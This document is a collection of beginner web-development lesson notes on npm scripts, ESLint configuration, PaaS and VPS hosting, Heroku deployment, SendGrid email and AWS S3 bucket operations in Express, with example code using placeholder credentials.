    "watch:js": "watchify project/app.js -do project/bundle.js",
    "build:css": "node-sass --include-path scss scss/main.scss   public/css/main.css",
    "watch:css": "nodemon -e scss -x \"npm run build:css\""
  },
  "dependencies": {
    "browserify": "^14.4.0",
    "node-sass": "^4.5.3",
    "watchify": "^3.9.0",
    "nodemon": "^1.11.0"
  }
}
```

### Running 'watch'  

```
npm run watch
```

## Putting It All Together  

* Let's pretend we:

  * add an `http-server` and run it via a `serve` script.

  * want to run all of it from one command via `start`:

  * This script might look something like this:
  
```
  {
    "name": "build-app",
    "main": "index.js",
    "scripts": {
      "start": "npm run serve & npm run watch",
      "serve": "http-server",
      "build": "npm run build:js & npm run build:css", // Runs build scripts.
      "watch": "npm run watch:js & npm run watch:css", // Runs 'watch' scripts
      "build:js": "browserify main.js -o bundle.js", // Bundles all JavasScript using browserify
      "watch:js": "watchify project/app.js -do project/bundle.js", // Recompiles css.
      "build:css": "node-sass --include-path scss scss/main.scss   public/css/main.css", // Compiles css.
      "watch:css": "nodemon -e scss -x \"npm run build:css\"" // Monitors for css changes and restarts the server when changes are detected.
    },
    "dependencies": {
      "browserify": "^14.4.0",
      "node-sass": "^4.5.3",
      "watchify": "^3.9.0",
      "nodemon": "^1.11.0"
    }
  }
```

### Running 'start'  

```
npm run start
```

## Best Practices  

> *Don't exit with a non-zero error code unless you really mean it. Except for uninstall scripts, this will cause the npm action to fail, and potentially be rolled back. If the failure is minor or only will prevent some optional features, then it's better to just print a warning and exit successfully.*
> 
> *Try not to use scripts to do what npm can do for you. Read through package.json to see all the things that you can specify and enable by simply describing your package appropriately. In general, this will lead to a more robust and consistent state.*
> 
> *Inspect the env to determine where to put things. For instance, if the npmconfigbinroot environment variable is set to /home/user/bin, then don't try to install executables into /usr/local/bin. The user probably set it up that way for a reason.*
> 
> *Don't prefix your script commands with "sudo". If root permissions are required for some reason, then it'll fail with that error, and the user will sudo the npm command in question.*
> 
> *Don't use install. Use a .gyp file for compilation, and prepublish for anything else. You should almost never have to explicitly set a preinstall or install script. If you are doing this, please consider if there is another option. The only valid use of install or preinstall scripts is for compilation which must be done on the target architecture.*

## Recommendation  

* Watch: [Nordic.js 2015 • Kate Hudson - Advanced front-end automation with npm scripts](https://www.youtube.com/watch?v=0RYETb9YVrk&feature=youtu.be&list=PLw5h0DiJ-9PAZ5-LYQY_JlCojZ5Q9BMHA)

---

[Productivity and UNIX: Introduction](ProductivityUNIXIntroduction.md)

# Using ESLint to find errors and coding style irregularities  

## Terminology  

`ESLint`: open source JavaScript linting utility used to find problematic patterns or code that doesn't adhere to certain style guidelines.1

## Installation  

### Global  

```
npm install --global eslint
```

### Local from project directory  

* When upgrading from a previous version, npm *will not* update to the latest release, so to be safe use the `latest` tag.

```
npm install eslint@latest --save-dev  
```

## Editor Installation  

### Atom  

* Preferences

  * Install

    * Search for and install: `linter-eslint`. [Docs](https://atom.io/packages/linter-eslint)

    * Search for and install: `linter` by steelbrain. [Docs](https://atom.io/packages/linter)

    * Restart atom.

### Sublime  

* Preferences

  * Browse packages

  * Browse up a folder and then go into the `Installed Packages` folder.

  * Download [Package Control.sublime-package]()

  * Copy this package into the `Installed Packages` directory.

  * Restart Sublime.

* From the editor:

  * `shift-command-p`

  * Type `Install packages` and click on it.

  * Search for `SublimeLinter-jshint`.

    * This will pull up the docs.

    * At the bottom it will ask you to npm install the plugin: `npm install -g jshint`

    * You are all done!

    * When the linter detects an error, it will highlight it and denote it with a dot. Clicking on the dot will show the error message at the bottom of the editor.

## Editor Examples  

### Atom  

![atom-eslint.png](./images/atom-eslint.png)

### Sublime  

![sublim-jshint.png](./images/sublim-jshint.png)

## Project Specific Configuration  

### Adding the configuration file  

* Use the ESLint cli command:

  * If global installation: eslint --init

  * If local installation: ./node_modules/.bin/eslint --init

* The cli will present you with some configuration prompts. Answer according to project specifications.

![eslint-cli.png](./images/eslint-cli.png)

* The cli generates three main objects: rules, env, and extends

### Example

```js
{
  "rules": {
      "indent": [
          2,
          "tab"
      ],
      "quotes": [
          2,
          "single"
      ],
      "linebreak-style": [
          2,
          "unix"
      ],
      "semi": [
          2,
          "always"
      ]
  },
  "env": {
      "es6": true,
      "node": true
  },
  "extends": "eslint:recommended"
}
```

### Adding rules  

* Rules are not automatically added by *default*.

* You can add 'rules' by adding them to the `rules` object.

  * You must specify the error lever for each `rule`.

    * Basic rules:

      * `0`: turns rule off.

      * `1`: turns on warning.

        * `ESLint` exits with a `0` code.

      * `2`: turns on error.

        * `ESLint` exits with a `1` code, breaking the build.

    * You can also include error level options for each `rule`.

    * See full `rules` configuration [docs](https://eslint.org/docs/user-guide/configuring#configuring-rules).

* See complete list of [rules](https://eslint.org/docs/rules/#nodejs-and-commonjs).

  * Node.js and common js [rules](https://eslint.org/docs/rules/#nodejs-and-commonjs).

### Example

```js
{
    "rules": {
        "quotes": [2, "double"], // Error level of 2 and option
        "curly": 1 // Error level only
    }
}
```

### Adding environments  

* You can specify environment specific behavior by specify the environment you are developing for.

* For example, setting an `env` of `broswer` to `true`, will tell `ESLint` not to have a meltdown when you use global variables without defining them first.

* To a an environment, simple add the specific environment under the `env` object.

### Example

```js
//Adding 'browser' to the above example.
{
    "rules": {
      // rules
    },
    "env": {
        "es6": true,
        "node": true,
        "browser": true
    },
    // extends
}
```

### Adding globals  

* You can specify global variables by adding them in `globals` object.

  * Setting the variable name to `true` allows for the variable to be overwritten.

  * Setting the variable name to `false` disallows overwriting the variable.

#### Example

```js
{
    "globals": {
        "var1": true,
        "var2": false
    }
}
```

### Adding extends  

* `extends` makes it possible to add `recommended rules` in order to prevent bugs.

* `recommended rules` *do not* include styling `rules`.

* In the example above we opted-in for the `ESLint` recommended rules by adding the line: `"extends": "eslint:recommended"`

### Specifying Parser  

* The defaul parser is `Espree`.

* See [docs](https://eslint.org/docs/user-guide/configuring#specifying-parser-options) for full list of parser options and configuration.

* To specify a different parser, add the following:

```js
{
    "parser": "esprima",
    "rules": {
        "semi": "error"
    }
}
```

### Specifying parser options  

* We can specify parser options by adding this to the `parserOptions` object.

* For example, if we want to enable ES2015 and enable JSX, we would add the following:

```js
"parserOptions": {
  "ecmaVersion": 6,
  "ecmaFeatures": {
    "jsx": true
  }
},
```

### Adding plugins  

* Plugins come packed with their on set of rules. For example, if working in a react project, you might want to use the react ESLint plugin.

  * Install `eslin-plugin-react`: `npm install eslint-plugin-react --save-dev`

#### Configuration

```js
{
  "rules": {
      "indent": [
          2,
          "tab"
      ],
      "quotes": [
          2,
          "single"
      ],
      "linebreak-style": [
          2,
          "unix"
      ],
      "semi": [
          2,
          "always"
      ]
  },
  "plugins": {
    "react"
  },
  "ecmaFeatures": {
    "jsx": true
  },
  "env": {
      "es6": true,
      "node": true
  },
  "extends": "eslint:recommended"
}
```

## Online Rule Generators  

* To quickly create rules, you could use an online generator, such as the [eslintrc-generator](http://rapilabs.github.io/eslintrc-generator/).

## ESLint CLI  

* The general cli format is: `eslint [options] [file/dir]`.

  * Linting a directory: `eslint app.js`

  * Linting a single file: `eslint app-dir/`

* Output organization:

| File name | | | |
| ---	| --- | ---	| --- |
| line:column	| warning/error	| error reason	| rule name |

#### Example

![lint-cli-output.png](./images/lint-cli-output.png)

Lesson Footnotes
1: About-ESLint

---

[Cloud Computing: Introduction](CloudComputingIntroduction.md)

# Platform-as-a-service And Virtual-private-servers  

## Platform-as-a-service  

* A cloud computing model which delivers applications over the internet.

* Users access `PaaS` services through the web browsers and providers charge a flat monthly fee or a per-use fee.

* A `PaaS` provider, such as `Heroku`, delivers a pre-configured `platform` (both the hardware and software tools) needed for the development of applications.

  * This makes it possible for developers to include cloud-hosted software logic into their applications.

  * This platform is fully managed by the provider. The user does not have control or manages the underlying infrastructure.

  * This enables developers to focus on application development without having to worry with the installation and maintenance of in-house hardware and software tools.

  * **Underlying infrastructure**:

    * Hardware: servers, networks, and storage.

    * Software: OS, libraries, programming languages, database management system, server software, runtime environments, integration software and security software.

* Some of the cloud characteristics of `PaaS` are: high-availability, scalability, and multi-tenancy.

* `PaaS` makes it possible for developers to make frequent code changes, even change or upgrade OS features.

* `PaaS` makes the app development, testing and deployment quicker, simpler and more cost effective.

* The nature of `PaaS` makes collaboration easier.

* Other benefits:

  * `HTTP Caching Server`: static contents (CSS, images, etc) are loaded from cache, instead of having to be processed by the application server. This improves performance.

  * Redundancy: since resources are spread out geographically over multiple servers, it makes it to overcome failures with little or no downtime.

### PaaS providers  

* These are some `PaaS` providers: [Amazonw Web Services](https://aws.amazon.com/), [Heroku](https://www.heroku.com/), [Google App Engine](https://cloud.google.com/appengine/), [Azure](https://azure.microsoft.com/en-us/), and [Mendix](https://www.mendix.com/).

## Virtual-private-servers  

* A `VPS` or a `virtual personal server` is a software-created emulation of a physical server.

* A `VPS` runs from a powerful host server (running Linux, FreeBSD or Windows) making it possible to run several `virtual machines` (using virtualization software such as `hypervisor`), each with their own specific configuration (OS, memory, storage, application, etc) and restricted access to a portion of the physical server's resources.

  * **Virtualiztion**:

    * `Containers`: it runs on the same OS as the host. It uses software to mimic the functionality of an independent server.

    * `Hardware virtualization`: all hardware components are emulated.

  * A dynamic `VPS` makes it possible to upgrade memory, storage, bandwidth, and processor while the server is running.

  * Upon signing up for the service, a user is assigned root administrative privileges and has full control over the server.

    * The user then selects the desired OS and subsequently can customize the server, and install, uninstall or update any OS compatible software.

  * **Hosting**:

    * A user can host multiple websites, such as a development website and a production website simultaneously.

    * A user can host services such as e-commerce, a mail server, or File Transfer Protocol.

* A `VPS` offers a flexible, scalable and affordable service where users have full control over the server, ranging from root access, IPs assignments, self-service reboots, and flexible OS switching.

* On the flip side, performance can be an issue. In some cases some `VM`'s might consume too many resources affecting the performance of adjacent `VM`'s. Some `VPS` providers may throttle a server's performance in order to maximize the number of `VM`'s running on the server. A `VPS` is also more expensive than `shared hosting`.

* Even though scalable (vertical or horizontal), the process is more involved that with `PaaS`, which can be scaled through a CLI or web portal.

* More importantly, compared to `PaaS`, **the user manages and maintains the system**.

### VPS providers  

* Some `VPS` providers: [Digital Ocean](https://www.digitalocean.com/), [Linode](https://www.linode.com/).

---

[Cloud Computing: Introduction](CloudComputingIntroduction.md)

# Deploying A Node application on Heroku  

## Terminology  

`Heroku`: a `cloud platform as a service` used for the deployment of web applications.1

## Heroku Account  

* Create a [Heroku Account](https://signup.heroku.com/).

## Deployment Using The Heroku CLI  

### Prerequisite  

* Create a local repository of your project.

* Install the Heroku Command Line Interface (CLI).

  * Download it [here](https://devcenter.heroku.com/articles/getting-started-with-nodejs#set-up).

* Login to Heroku using the Heroku CLI.

```sh
$ heroku login
Enter your Heroku credentials.
Email: zeke@example.com
Password:
...
```

### Deploying to Heroku  

* `cd` into the project directory.

* Create the app on Heroku:

```sh
heroku create
```

* This creates a git remote (named `heroku`), which is associated with the local git repository.

* Heroku also generates a random name for the app. To add a name of your choice, simply add it to the end of the command: `$ heroku create APP-NAME`

* Then, deploy the app:

```sh
git push heroku master
```

* Ensure that an instance of the app is running:

```sh
heroku ps:scale web=1
```

* Open the app:

```sh
heroku open
```

### Provisioning add-ons and databases  

* [Provisioning add-ons](https://devcenter.heroku.com/articles/getting-started-with-nodejs#provision-add-ons).

* [Provisioning a database](https://devcenter.heroku.com/articles/getting-started-with-nodejs#provision-a-database).

## Manual Deployment  

* Login to your Heroku account and then head over to 'apps'.

* Click on `new` and then, `create new app`.

heroku_1.jpeg

* Next, give your app a name or a random name will be generated.

* Select the appropriate 'Deployment method'. Since we covered the `Heroku CLI` method already, select **'connect to GitHub'**.

heroku_method.jpeg

* Search for and select (click on **'connect'**) your repository from **'Connect to GitHub'**.

heroku_github.png

* Then, select **'Enable Automatic Deploys'** from **'Automatic deploys'**.

heroku_autodeploy.jpeg

* Select **'Deploy Branch'** from **'Manual deploy'**.

heroku_manuldeploy.jpeg

* Finally, open your app by selecting **'view'**.

### Provisioning add-ons  

* From the `Heroku` console, select the desired app.

  * Under **'Resources'** look for the desired resource using the 'add-ons' search box, for example: mongo.

  * Select, for example, 'mLab MongoDB'.

  * Select 'Sandbox -- Free' under **'Plan Name'**.

  * Then, select **'provision'**.

## Configuring And Accessing App Environmental Variables  

Many `APIs` require certain variables in order to operate, such as `API` keys, secrets, tokens, etc. There are two ways to set these variables.

### Heroku CLI  

* Setting variables:

```sh
$ heroku config:set VARIABLE_NAME=VALUE
```

* Then, do the following to set the variables in the app.

```sh
$ heroku local
```

* Viewing variables

```sh
$ heroku config
```

### Manually  

* Select the desired app.

* Under **'Settings'** select **Reveal Config Vars** ('Config Variables')

  * Enter the required configuration variables, such as API key, secrets, etc.
  
heroku_env.jpeg

### Accessing the variables  

* In this example we created the following environmental variable: `API_KEY=foo`

#### Example

```js
app.get('/example', function(request, response) {
    var result = ''
    var key = process.env.API_KEY;
    function apiExample(key){
      //Do something with key...
    }
  res.send('Successfully connected to API');
});
```

##### Lesson Footnotes

* 1: [Heroku](https://www.heroku.com/what)

---

[Cloud Computing: Introduction](CloudComputingIntroduction.md)

# Sending Emails with SendGrid  

## Terminology  

`SendGrid`: cloud-based SMTP provider.

## Setup and Installation  

* Register for a trial [SendGrid account](https://app.sendgrid.com/signup?id=71713987-9f01-4dea-b3d4-8d0bcd9d53ed&co=true).

  * Login and retrieve your API key from 'settings' in the dashboard.

* Install SendGrid in your project directory: `$ npm install sendgrid --save`

## SendGrid API  

* See [docs](https://sendgrid.com/docs/API_Reference/api_v3.html) for full implementation details.

  * [Node.js implementation with mail helper class and without mail helper class.](https://github.com/sendgrid/sendgrid-nodejs)

## Basic Implementation  

* In this example we use the 'mail helper class'.

### Context  

* An app that uses a basic form to send emails.

#### Email form:

![sendgrid-send](./images/sendgrid-send.jpeg)

#### Confirmation page:

![sendgrid-sent](./images/sendgrid-sent.jpeg)

### App Structure  

* App

  * views

    * index.mustache
    
    * sent.mustache

  * app.js
  
  * package.json
  
### Environmental Variable Setup  

```
echo "export SENDGRID_API_KEY='YOUR_API_KEY'" > sendgrid.env
echo "sendgrid.env" >> .gitignore
source ./sendgrid.env
```

### App Setup  

```
var express = require('express');
var path = require('path');
var bodyParser = require('body-parser');
var mustacheExpress = require('mustache-express');
var router = express.Router();

var app = express();

// SendGrid Setup:
var sendgridApiKey = 'your-api-key';
// Recommended:
// In development use the environmental variable:
// var sendgridApiKey = process.env.SENDGRID_API_KEY;
var Sendgrid = require('sendgrid')(sendgridApiKey);
var helper = require('sendgrid').mail;

// Setup view engine:
app.engine('mustache', mustacheExpress());
app.set('views', './views');
app.set('view engine', 'mustache');

// Parse form data:
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));

app.get('/', function (req, res) {
  // Render email form:
  res.render('index');
})

// Send email on post:

app.post('/email/sent', function(req, res, next){
var fromEmail = new helper.Email(req.body.from);
var toEmail = new helper.Email(req.body.to);
var subject = req.body.subject;
var content = new helper.Content('text/plain', req.body.message); // Two parameters needed: type and value.
// It is possible to set the content to HTML:
//      "type": "text/html",
//      "value": "<html><p>Hello, world!</p></html>"

var mail = new helper.Mail(fromEmail, subject, toEmail, content);
  var sgReq = Sendgrid.emptyRequest({
    method: 'POST',
    path: '/v3/mail/send',
    body: mail.toJSON()
  });

  Sendgrid.API(sgReq, function (err) {
    if (err) {
      next(err);
      return;
    }
    // Render success page:
    res.render('sent', { message: 'Your email was sent!', user: req.body.user })
    return;
  });
});

// Error handlers...

app.listen(3000, function () {
  console.log('Successfully started node application!')
})
```

### Try it!  

[SendGrid App Example]()

---

[Cloud Computing: Introduction](CloudComputingIntroduction.md)

# Storing and retrieving objects in S3 block storage  

## Terminology  

`S3`: stands for simple storage service.

> *Amazon Simple Storage Service (Amazon S3) is object storage with a simple web service interface to store and retrieve any amount of data from anywhere on the web. It is designed to deliver 99.999999999% durability, and scale past trillions of objects worldwide.1*

`Bucket`: `AWS S3` storage resource for storing objects.2

* Bucket names are globally unique.

* Buckets are region specific.

## S3 Storage Methods  

### Creating a bucket  

* For the latest method, see the `CreateBucket` [docs](http://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/S3.html#createBucket-property).

* Basic bucket creation.

```js
var params = {
 Bucket: "examplebucket" /* required */
};
s3.createBucket(params, function(err, data) {
  if (err) console.log(err, err.stack); // an error occurred
  else     console.log(data);           // successful response
})
```

* Advanced bucket creation, specifying access rights and location constraints.

```js
var params = {
  Bucket: 'STRING_VALUE', /* required */
  ACL: private | public-read | public-read-write | authenticated-read,
  CreateBucketConfiguration: {
    LocationConstraint: EU | eu-west-1 | us-west-1 | us-west-2 | ap-south-1 | ap-southeast-1 | ap-southeast-2 | ap-northeast-1 | sa-east-1 | cn-north-1 | eu-central-1
  },
  GrantFullControl: 'STRING_VALUE',
  GrantRead: 'STRING_VALUE',
  GrantReadACP: 'STRING_VALUE',
  GrantWrite: 'STRING_VALUE',
  GrantWriteACP: 'STRING_VALUE'
};
s3.createBucket(params, function(err, data) {
  if (err) console.log(err, err.stack); // an error occurred
  else     console.log(data);           // successful response
});
```

### Uploading an object  

* For the latest method, see the `putObject` [docs](http://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/S3.html#putObject-property).

* See 'Implementation' for details about using the [Multer](https://www.npmjs.com/package/multer) / [Multer-s3](https://www.npmjs.com/package/multer-s3) modules and `AWS` to upload a file.

```js
var params = {
 Body: <Binary String>,
 Bucket: "examplebucket",
 Key: "HappyFace.jpg"
};
s3.putObject(params, function(err, data) {
  if (err) console.log(err, err.stack); // an error occurred
  else     console.log(data);           // successful response
  /*
  data = {
   ETag: "\"6805f2cfc46c0f04559748bb039d69ae\"",
   VersionId: "tpf3zF08nBplQK1XLOefGskR7mGDwcDk"
  }
  */
});
```

### Retrieving an object  

* For the latest method, see the `GetObject` [docs](http://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/S3.html#getObject-property).

```js
var params = {
  Bucket: "examplebucket", /* required */
  Key: "HappyFace.jpg" /* required */
 };
 s3.getObject(params, function(err, data) {
   if (err) console.log(err, err.stack); // an error occurred
   else     console.log(data);           // successful response
   /*
   data = {
    AcceptRanges: "bytes",
    ContentLength: 3191,
    ContentType: "image/jpeg",
    ETag: "\"6805f2cfc46c0f04559748bb039d69ae\"",
    LastModified: <Date Representation>,
    Metadata: {
    },
    TagCount: 2,
    VersionId: "null"
   }
   */
 });
```
 
### Listing Buckets  

* For the latest method, see the `ListBuckets` [docs](http://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/S3.html#listBuckets-property).

```js
s3.listBuckets(function(err, data) {
  if (err) console.log(err, err.stack); // an error occurred
  else     console.log(data);           // successful response
});
```

### Deleting a Bucket  

* For the latest method, see the `DeleteBucket` [docs](http://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/S3.html#deleteBucket-property).

> Bucket must be empty first!

```js
var params = {
  Bucket: 'STRING_VALUE' /* required */
};
s3.deleteBucket(params, function(err, data) {
  if (err) console.log(err, err.stack); // an error occurred
  else     console.log(data);           // successful response
});
```

### Deleting an object  

* For the latest method, see the `DeleteObject` [docs](http://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/S3.html#deleteObject-property).

```js
var params = {
 Bucket: "examplebucket", /* required */
 Key: "objectkey.jpg" /* required */
};
s3.deleteObject(params, function(err, data) {
  if (err) console.log(err, err.stack); // an error occurred
  else     console.log(data);           // successful response
  /*
  data = {
  }
  */
});
```

Implementation  

* The following implementation is a basic example of how to use these methods in an `Express` setting.

* Note that this example only covers the basics, so your *production* implementation should have more robust features such as:

  * User login.
  
  * Authentication.
  
  * Input sanitation.
  
  * Router.
  
  * Error handlers.
  
  * etc.
  
* In this basic implementation setting we use specific routes to exemplify each method. This is for demonstration purposes, only.

  * It would be more useful to have a separate file with all methods in order to call them whenever needed in `app.js`.

## Prerequisite  

* Create an `AWS` [free account](https://aws.amazon.com/?nc2=h_lg).

* Retrieve your `key` and `secret`.

  * Under your account name, go to [My Security Credentials](https://console.aws.amazon.com/iam/home?region=us-east-2#/security_credential)

  * Retrieve `key` and `secret` from 'Access Keys (Access Key ID and Secret Access Key)'.

## Setup  

### Install Multer, multer-s3, express-handlebars, and aws-sdk  

```
npm install multer multer-s3 aws-sdk mustache-express --save
```

### Setup s3 config.json file  

* Create a file named `s3config.json`.

* Save to your project folder and save your credentials.

```ja
{
   "accessKeyId": "access key id goes here",
   "secretAccessKey": "secret access key goes here",
   "region": "us-east-1" // See 'region' note below.
}
```

* `Region`: find your region [here](http://docs.aws.amazon.com/general/latest/gr/rande.html#s3_region).

### App structure  

* `App`

  * `public`
  
    * `css`
    
      * styles.css
      
  * `views`

    * `layouts`
    
      * header

    * view
    
    * upload
    
    * message

    * select_create_bucket

    * delete_bucket

  * app.js
  
  * package.json
  
  * s3config.json

### app.js  

```js
var express = require( 'express' );
var path = require( 'path' );
var app = express();
var bodyParser = require( 'body-parser' );

// Import mustache
var mustacheExpress = require( 'mustache-express' );


// Import multer and multer-s3
var multer = require( 'multer' );
var multerS3 = require( 'multer-s3' );


// Import, set up AWS and import AWS configuration.
var AWS = require( 'aws-sdk' );
AWS.config.loadFromPath( './s3config.json' );
var s3 = new AWS.S3();


// App use
app.use( express.static( __dirname + '/public' ) );
app.use( bodyParser.json() );
app.use( bodyParser.urlencoded( {
  extended: false
} ) );

// View engine
app.engine( 'mustache', mustacheExpress() );
// Specify layout and layout location
app.set( 'view engine', 'mustache' );
app.set( 'views', __dirname + '/views' );

// Multer/Multer-s3 & AWS upload method
var upload = multer( {
  storage: multerS3( {
    s3: s3,
    bucket: function( req, file, cb ) {
      cb( null, req.body.bucket ) // Save file to selected bucket.
    },
    metadata: function( req, file, cb ) {
      cb( null, {
        fieldName: file.fieldname
      } );
    },
    key: function( req, file, cb ) {
      //console.log( 'file ', file );
      cb( null, file.originalname );
    }
  } )
} );


// Select bucket,  display buckets, create bucket
app.get( '/', function( req, res, next ) {
  s3.listBuckets( {}, function( err, data ) {
    if ( err ) {
      return res.render( 'message', {
        warning: "Error",
        message: err.message,
        code: err.code
      } );
    }
    var buckets = data.Buckets;
    var bucketsCounter = buckets.length;
    var showBuckets = true; // Set render conditions
    if ( bucketsCounter == 0 ) {
      showBuckets = false;
    }
    res.render( 'select_create_bucket', { // Render form and bucket list.
      bucketItems: buckets,
      counter: bucketsCounter,
      showBuckets: showBuckets
    } )
  } );
} );


// Get buckets and upload to selected bucket
app.get( '/bucket/upload', function( req, res, next ) {
  s3.listBuckets( {}, function( err, data ) {
    if ( err ) {
      return res.render( 'message', {
        warning: "Error",
        message: err.message,
        code: err.code
      } );
    }
    var buckets = data.Buckets;
    res.render( 'upload', { // Render form and bucket list.
      buckets: buckets
    } )
  } );
} );

// Get all buckets and display objects from selected bucket
app.get( '/bucket', function( req, res, next ) {
  s3.listBuckets( {}, function( err, data ) {
    if ( err ) {
      return res.render( 'message', {
        warning: "Error",
        message: err.message,
        code: err.code
      } );
    }
    var buckets = data.Buckets;
    res.render( 'selectbucket', { // Render form and bucket list.
      buckets: buckets
    } )
  } );
} );

// Get all buckets and select bucket for deletion
app.get( '/bucket/delete', function( req, res, next ) {
  s3.listBuckets( {}, function( err, data ) {
    if ( err ) {
      return res.render( 'message', {
        warning: "Error",
        message: err.message,
        code: err.code
      } );
    }
    var buckets = data.Buckets;
    res.render( 'delete_bucket', { // Render form and bucket list.
      buckets: buckets
    } )
  } );
} );

// View objects from selected bucket
app.post( '/view', function( req, res, next ) {
  var params = {
    Bucket: req.body.bucket || bucket
  }; // Set Bucket parameter for listObjects()
  s3.listObjects( params, function( err, data ) {
    var bucketContents = data.Contents;
    var show = true; // Set render conditions
    if ( bucketContents == 0 ) {
      show = false;
    }
    var files = []; // Create array to store urls and keys (file names).
    for ( var i = 0; i < bucketContents.length; i++ ) { // Loop over bucketContents
      var urlParams = {
        Bucket: params.Bucket,
        Key: bucketContents[ i ].Key
      };
      s3.getSignedUrl( 'getObject', urlParams, function( err, url, key ) { //Get signed url.
        files.push( bucket = { //Push to array.
          file: urlParams.Key,
          url: url,
        } );
        app.set( 'bucket', params.Bucket )
      } );
    }
    res.render( 'view', {
      files: files,
      bucket: params.Bucket,
      show: show,
    } );
  } );
} )

// Create bucket
app.post( '/', function( req, res, next ) {
  var bucket = req.body.bucket;
  var params = {
    Bucket: bucket
  };
  s3.createBucket( params, function( err, data ) {
    if ( err ) {
      return res.render( 'message', {
        warning: "Error",
        message: err.message,
        code: err.code
      } );
    }
    var location = data.Location;
    res.render( 'view', {
      bucket: bucket
    } ); // Render view after creating bucket
  } );
} );


// File upload to selected bucket
app.post( '/bucket/upload/success', upload.single( 'file' ), function( req, res, next ) {
  var data = req.file.originalname;
  var location = req.file.location;
  var bucket = req.body.bucket;
  res.render( 'message', {
    success: "Success!",
    uploaded: "Successfully uploaded, " + data + " to " + location + " in: ",
    bucket: bucket
  } );
} );

// Delete object from selected bucket
app.post( '/view/delete/', function( req, res, next ) {
  var key = req.body.data;
  var bucket = app.get( 'bucket' );
  var params = {
    Bucket: bucket,
    Key: key
  };

  s3.deleteObject( params, function( err, data ) {
    if ( err ) {
      return res.render( 'message', {
        warning: "Error",
        message: err.message,
        code: err.code,
        bucket: bucket,
      } );
    } else {
      res.render( 'message', {
        success: "Success!",
        deleted: params.Key + " has been deleted!",
        bucket: bucket,
      } );
    }
  } );
} );

// Delete selected bucket
// Bucket must be empty, first!
app.post( '/bucket/delete', function( req, res, next ) {
  var bucket = req.body.bucket;
  //console.log( bucket )
  var params = {
    Bucket: bucket
  };
  s3.listObjects( params, function( err, data ) {
    var bucketContents = data.Contents;
    if ( bucketContents.length >= 1 ) { // If bucket has content, empty it first...
      console.log( "Emptying bucket first..." )
      for ( var i = 0; i < bucketContents.length; i++ ) {
        var params = {
          Bucket: bucket,
          Key: bucketContents[ i ].Key
        };
        s3.deleteObject( params, function( err, data, next ) {
          if ( err ) {
            return res.render( 'message', {
              warning: "Error",
              message: err.message,
              code: err.code
            } );
          } else { // Once it is empty, delete the bucket...
            console.log( 'Deleting bucket...' )
            var params = {
              Bucket: bucket
            }
            s3.deleteBucket( params, function( err, data ) {
              if ( err ) {
                return res.render( 'message', {
                  warning: "Error",
                  message: err.message,
                  code: err.code
                } );
              }
              console.log( 'Done deleting bucket.' )
              res.render( 'message', {
                success: "Success!",
                bucketDelete: bucket + " was successfully delted!"
              } );
            } );
          }
        } );
      }
    } else if ( bucketContents.length == 0 ) { // If bucket is empty, delete it...
      console.log( 'Bucket is empty, deleting...' )
      var params = {
        Bucket: bucket
      }
      s3.deleteBucket( params, function( err, data ) {
        if ( err ) {
          return res.render( 'message', {
            warning: "Error",
            message: err.message,
            code: err.code
          } );
        }
        console.log( 'Done deleting bucket.' )
        res.render( 'message', {
          success: "Success!",
          bucketDelete: bucket + " was successfully delted!"
        } );
      } );
    }
  } );
} );

// Error handlers...


app.listen( 3000, function() {
  console.log( 'Successfully started node application!' )
} )
```

## Try it!  

s3_example.zip (9 MB)

* First, create a `AWS` account, look up your region, and get your key / secret.

* Add them to `s3config.json`.

* Then, `npm start`

#### Lesson Footnotes

1: [AWS - S3](https://aws.amazon.com/s3/)

2: [AWS - S3 Bucket](http://docs.aws.amazon.com/AmazonS3/latest/dev/UsingBucket.html)

---

[Cloud Computing: Introduction](CloudComputingIntroduction.md)

# Block Level Storage  

Block level storage is a widely used storage system technology

* sometimes called a physical record

* uses Storage Area Network (SAN) storage

* composed of raw volumes of storage or **blocks**

  * blocks have a max width

  * blocks can be controlled as an individual hard drive

  * blocks controlled by server based operating systems

  * blocks can be individually formatted with the required file system

### Usage  

* used in server side processing, with Java, Ruby, .Net, and other programming languages

* usually abstracted by a file system or database management system (DBMS)

* works well for file systems and databases

  * provides consistent I/O performance and low-latency connectivity

  * can be used to store files

  * data transportation is efficient and reliable

* can work for virtual machines

* can be used for RAID Volumes, combining multiple disks organized through stripping or mirroring

* used in running applications like Oracle, SAP, Microsoft Exchange, and Microsoft SharePoint

* supports individual formatting of file systems like NFS, NTFS or SMB (Windows) or VMFS (VMware)

### Commonly used Providers  

* AWS Elastic Block Storage (EBS)

* Rackspace Cloud Block Storage

* Azure Premium Storage

* Google Persistent Disks
